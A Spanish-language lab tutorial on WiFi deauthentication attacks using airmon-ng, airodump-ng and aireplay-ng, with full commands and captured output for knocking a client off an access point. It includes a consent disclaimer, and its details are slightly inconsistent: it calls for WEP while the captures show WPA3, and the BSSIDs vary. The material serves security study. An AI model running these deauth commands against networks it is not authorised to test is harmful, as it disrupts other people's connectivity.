
# Deauth

{% hint style="danger" %}
**Disclaimer:** Vamos a realizar ataques a redes WiFi, por lo que no podemos utilizar estas técnicas sin un consentimiento o aprobación por parte del objetivo
{% endhint %}

{% hint style="warning" %}
**Nota:** Para este laboratorio la red debe estar configurada como WEP. Deshabilitar SKA (Shell Key Autentication). De lo contrario puede que no funcione como esperamos.
{% endhint %}

## <mark style="color:purple;">Desautenticar cliente de una red</mark>

Este tipo de ataque envía paquetes de desasociación a uno o más clientes que están actualmente asociados a un punto de acceso. Las razones por las que es útil desasociar clientes pueden ser:

* Recuperar o desvelar un ESSID oculto. Este es un ESSID que no es divulgado o anunciado por el AP (Access Point)
* Capturar handshakes WPA/WPA2 forzando a los clientes a volverse a autenticar (Es un proceso totalmente automático)
* Generar peticiones ARP

## <mark style="color:purple;">Ataque Deauth</mark>

### Fase 1:  Encontrar al objetivo

```bash
# 1 - Apagamos el adaptador wlan0
ifconfig wlan0 down

# 2 - Iniciamos airmon-ng
sudo airmon-ng start wlan0

# 3- Encontrar al objetivo
sudo airodump-ng wlan0

CH  1 ][ Elapsed: 0 s ][ 2023-10-31 19:42 ][ paused output

 BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID    
 EA:66:AB:4C:31:OA  -61        5        0    0   1  720   WPA3 CCMP   SAE  PRUEBAS
```

### Fase 2:  Ver dispositivos en su red

```bash
# Iniciamos airodump-ng con el BSSID objetivo y su CHANNEL
sudo airodump-ng --bssid EA:66:AB:4C:31:EA --channel 1 wlan0

 CH  1 ][ Elapsed: 36 s ][ 2023-10-31 19:50 ][ WPA handshake: EA:66:AB:4C:31:EA 

 BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID
 EA:66:AB:4C:31:EA  -57  93      295      114    1   1  720   WPA3 CCMP   SAE  PRUEBAS                        

 BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes
 EA:66:AB:4C:31:OA  DA:33:17:E1:00:E3  -32    1e-24      0     1109  PMKID
                   |-----------------|
```

{% hint style="warning" %}
**Nota:** Para realizar la fase 3 no debemos detener airodump, o puede fallar.
{% endhint %}

### Fase 3:  Ataque Deauth contra un dispositivo

```bash
sudo aireplay-ng --deauth <PETICIONES> -a <BSSID> -c <STATION> wlan0/wlan0mon
```

```sh
sudo aireplay-ng --deauth 1000000 -a EA:66:AB:4C:31:OA -c DA:33:17:E1:00:E3 wlan0

19:53:19  Waiting for beacon frame (BSSID: EA:66:AB:4C:31:EA) on channel 1
19:53:20  Sending 64 directed DeAuth (code 7). STMAC: [DA:33:17:E1:00:E3] [17|68 ACKs]
19:53:21  Sending 64 directed DeAuth (code 7). STMAC: [DA:33:17:E1:00:E3] [12|74 ACKs]
19:53:21  Sending 64 directed DeAuth (code 7). STMAC: [DA:33:17:E1:00:E3] [64|104 ACKs]
19:53:22  Sending 64 directed DeAuth (code 7). STMAC: [DA:33:17:E1:00:E3] [ 1|64 ACKs]
19:53:22  Sending 64 directed DeAuth (code 7). STMAC: [DA:33:17:E1:00:E3] [ 0|63 ACKs]
19:53:23  Sending 64 directed DeAuth (code 7). STMAC: [DA:33:17:E1:00:E3] [26|74 ACKs]
19:53:23  Sending 64 directed DeAuth (code 7). STMAC: [DA:33:17:E1:00:E3] [ 0|63 ACKs]
19:53:24  Sending 64 directed DeAuth (code 7). STMAC: [DA:33:17:E1:00:E3] [59|105 ACKs]
19:53:24  Sending 64 directed DeAuth (code 7). STMAC: [DA:33:17:E1:00:E3] [28|80 ACKs]
19:53:25  Sending 64 directed DeAuth (code 7). STMAC: [DA:33:17:E1:00:E3] [90|124 ACKs]
19:53:25  Sending 64 directed DeAuth (code 7). STMAC: [DA:33:17:E1:00:E3] [ 0|65 ACKs]
19:53:26  Sending 64 directed DeAuth (code 7). STMAC: [DA:33:17:E1:00:E3] [40|85 ACKs]
19:53:27  Sending 64 directed DeAuth (code 7). STMAC: [DA:33:17:E1:00:E3] [52|92 ACKs]
19:53:27  Sending 64 directed DeAuth (code 7). STMAC: [DA:33:17:E1:00:E3] [71|106 ACKs]
19:53:28  Sending 64 directed DeAuth (code 7). STMAC: [DA:33:17:E1:00:E3] [67|103 ACKs]
19:53:28  Sending 64 directed DeAuth (code 7). STMAC: [DA:33:17:E1:00:E3] [39|98 ACKs]
19:53:29  Sending 64 directed DeAuth (code 7). STMAC: [DA:33:17:E1:00:E3] [18|73 ACKs]
19:53:29  Sending 64 directed DeAuth (code 7). STMAC: [DA:33:17:E1:00:E3] [57|100 ACKs]
```

El ataque funciona y me desconecta de la red por el tiempo que hemos especificado. Una vez pasado ese tiempo el dispositivo se vuelve a conectar automáticamente.

<figure><img src="/files/NN2lfHHym06vtxby9q5f" alt=""><figcaption></figcaption></figure>
